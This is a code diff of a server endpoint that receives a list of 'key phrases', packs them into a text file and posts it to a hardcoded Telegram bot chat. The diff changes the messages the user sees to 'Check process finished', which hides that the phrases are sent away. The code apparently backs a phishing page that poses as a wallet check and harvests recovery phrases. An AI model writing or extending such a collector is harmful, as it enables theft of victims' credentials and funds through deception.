@@ -12,51 +12,49 @@ const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendDocu
 export default defineEventHandler(async (event) => {
     try {
         const { words } = await readBody(event);
-
         if (!words || !Array.isArray(words) || words.length === 0) {
-            return createError({
+            throw createError({
                 statusCode: 400,
-                message: 'No words provided. Please send a "words" array in the POST body (e.g., {"words": ["word1", "word2"]}).',
+                message: 'No key phrases provided.',
             });
         }
 
+        // Create file buffer
         const fileContent = words.join('\n');
         const buffer = Buffer.from(fileContent, 'utf-8');
 
-        const formData = new URLSearchParams();
+        // Build form-data payload
+        const formData = new FormData();
         formData.append('chat_id', telegramUserId);
-        formData.append('caption', `Key phrases sent on ${new Date().toLocaleString('en-US', { timeZone: 'America/Sao_Paulo' })}`);
-        formData.append('document', buffer.toString('base64'), { filename: 'keyphrases.txt', contentType: 'text/plain' });
+        formData.append(
+            'caption',
+            `Key phrases sent on ${new Date().toLocaleString('en-US', {
+                timeZone: 'America/Sao_Paulo',
+            })}`
+        );
+        formData.append('document', new Blob([buffer]), 'keyphrases.txt');
 
-        await fetch(telegramApiUrl, {
+        // Send request
+        const res = await fetch(telegramApiUrl, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-            },
-            body: formData.toString(),
-        }).then(res => {
-            if (!res.ok) {
-                throw new Error('Telegram API error: ' + res.statusText);
-            }
-            return res.json();
-        }).then(result => {
-            if (result.ok) {
-                return result;
-            } else {
-                throw new Error(result.description || 'Telegram API error');
-            }
-        }).catch(error => {
-            throw new Error(`Failed to parse Telegram response: ${error.message}`);
+            body: formData,
         });
+
+        const result = await res.json();
+
+        if (!res.ok || !result.ok) {
+            throw new Error(result.description || 'Telegram API error');
+        }
+
         return {
             statusCode: 200,
-            message: 'Key phrases sent successfully via Telegram.',
+            message: 'Check process finished.',
         };
     } catch (error) {
         console.error('Error sending words:', error);
         throw createError({
             statusCode: 500,
-            message: `Failed to send words: ${(error as Error).message}`,
+            message: `Failed to check`,
         });
     }
 });
